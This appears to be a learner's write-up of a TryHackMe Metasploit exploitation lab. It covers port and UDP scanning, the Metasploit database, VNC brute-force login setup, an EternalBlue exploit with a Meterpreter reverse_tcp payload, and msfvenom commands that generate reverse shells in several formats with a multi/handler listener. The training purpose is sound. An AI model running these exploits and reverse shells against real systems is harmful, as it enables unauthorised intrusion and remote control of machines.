# 🔐 TryHackMe - Metasploit: Exploitation (Complete Guide)

This document provides a comprehensive summary of the **Metasploit: Exploitation** room on TryHackMe. It walks through Metasploit’s capabilities in vulnerability scanning, exploitation, workspace management, session handling, and payload generation with `msfvenom`.

---

## 🧭 Task 1 - Introduction

This room covers:

- Scanning targets using Metasploit
- Managing multi-target engagements via the Metasploit database
- Performing vulnerability scans
- Exploiting known services on a network
- Creating and using payloads via `msfvenom`
- Opening and managing Meterpreter sessions

📁 Wordlist path (on AttackBox):
```
/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
```

---

## 🔍 Task 2 - Scanning with Metasploit

### 🔎 Available Port Scanners
List port scanning modules:
```bash
search portscan
```

Examples:
- `auxiliary/scanner/portscan/tcp` – TCP port scanner
- `auxiliary/scanner/portscan/syn` – SYN scan
- `auxiliary/scanner/portscan/ack` – ACK scan

### ⚙️ Portscan Options
Use `show options` inside the module:
```bash
use auxiliary/scanner/portscan/tcp
show options
```

Key parameters:
- `RHOSTS`: Targets (IP, CIDR, file)
- `PORTS`: e.g., `1-10000`
- `THREADS`: Number of concurrent threads
- `CONCURRENCY`: Number of ports checked simultaneously
- `DELAY`, `JITTER`, `TIMEOUT`: Tuning options for scan speed

### 🌐 Run Nmap within Metasploit
```bash
nmap -sS 10.10.12.229
```

---

### 🔵 UDP Scanning
Use:
```bash
use auxiliary/scanner/discovery/udp_sweep
run
```

Identifies basic UDP services like DNS, NetBIOS.

---

### 📦 SMB Version Detection
```bash
use auxiliary/scanner/smb/smb_version
run
```

Returns:
- Host OS
- Workgroup
- Hostname

---

## 🗂️ Task 3 - The Metasploit Database

### 🛠️ Initialization (Kali only)
```bash
systemctl start postgresql
msfdb init
```

---

### 🧩 Managing Workspaces
```bash
workspace           # list workspaces
workspace -a NAME   # add new
workspace NAME      # switch
workspace -d NAME   # delete
workspace -h        # help
```

> Default workspace: `default`

---

### 🛰️ Scanning with db_nmap
```bash
db_nmap -sV -p- 10.10.12.229
```

Stores results in the database.

---

### 🔍 Reviewing Results
```bash
hosts
services
```

- `hosts`: IPs, MACs, names, OS
- `services`: Ports, states, protocols, banners

Search specific ports/services:
```bash
services -S netbios
```

---

### 📌 Use Saved Hosts for Modules
```bash
hosts -R
use auxiliary/scanner/smb/smb_ms17_010
show options
run
```

---

## 🛡️ Task 4 - Vulnerability Scanning

### 🔎 Search for VNC Scanners
```bash
search vnc
use auxiliary/scanner/vnc/vnc_login
info
```

Useful options:
- `USER_FILE`, `PASS_FILE`: Set brute-force lists
- `THREADS`, `RHOSTS`, `RPORT`: Standard network config

> Supports blank passwords, user-as-pass testing, and credential reuse.

---

## 💥 Task 5 - Exploitation with Metasploit

### 🔍 Example: EternalBlue
```bash
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
```

### 🧬 Set Exploit Options
```bash
set RHOSTS 10.10.12.229
set LHOST 10.10.x.x
set LPORT 4444
set payload windows/x64/meterpreter/reverse_tcp
exploit
```

> May require trial-and-error depending on AV/firewall restrictions.

---

### 🔗 After Exploitation
List sessions:
```bash
sessions
```

Interact with session:
```bash
sessions -i 1
```

Background session:
```bash
CTRL+Z
```

Session help:
```bash
sessions -h
```

---

## 🧪 Task 6 - Msfvenom (Payload Generation)

### 🧾 List All Payloads
```bash
msfvenom -l payloads
```

### 🔧 Generate Payload (PHP)
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.x.x LPORT=7777 -f raw > reverse_shell.php
```

Add missing tags:
```php
<?php
// payload...
?>
```

### 🔁 Encode Payloads
```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -e php/base64
```

---

### 🎯 Multi/Handler (Listener)
```bash
use exploit/multi/handler
set payload php/reverse_php
set LHOST 10.10.x.x
set LPORT 7777
run
```

---

### 📦 Other msfvenom Formats

| OS       | Command |
|----------|---------|
| Linux    | `-f elf > shell.elf` |
| Windows  | `-f exe > shell.exe` |
| PHP      | `-f raw > shell.php` |
| ASP      | `-f asp > shell.asp` |
| Python   | `-f raw > shell.py` |

> All payloads above are reverse shells and require a running listener (`multi/handler`) on the attack machine.

---


### 🖼️ Fixing the PHP Payload File

When generating a PHP payload using `msfvenom`, the output often lacks a valid PHP opening tag and closing tag.

#### 🔴 Initial Output (Incorrect)
The payload is commented out:
![Incorrect PHP Tag](https://github.com/user-attachments/assets/655cd784-ffac-4af2-87c2-064e0017f06e)

#### ✅ Corrected Start Tag
You must replace it with a valid PHP start tag:
![Correct PHP Start](https://github.com/user-attachments/assets/590ccf00-8651-4ddf-b872-2d3e136a1254)

#### ✅ Add a Closing Tag
Also, ensure the file ends with:
![PHP End Tag](https://github.com/user-attachments/assets/6425f383-d63c-4059-85d9-9ed3ae82366f)

> This ensures the payload is treated as valid PHP code by the server when executed.


## ✅ Task 7 - Summary

After this room, you should now be able to:
- Scan ports/services using Metasploit modules and `db_nmap`
- Organize engagements with the database and workspaces
- Find and exploit vulnerabilities like MS17-010
- Manage multiple sessions with Meterpreter
- Generate standalone payloads with `msfvenom`
- Receive shells using `multi/handler`

---

### 📚 References

- [Metasploit Docs](https://docs.rapid7.com/metasploit/)
- [TryHackMe - Metasploit Room](https://tryhackme.com/room/metasploit)
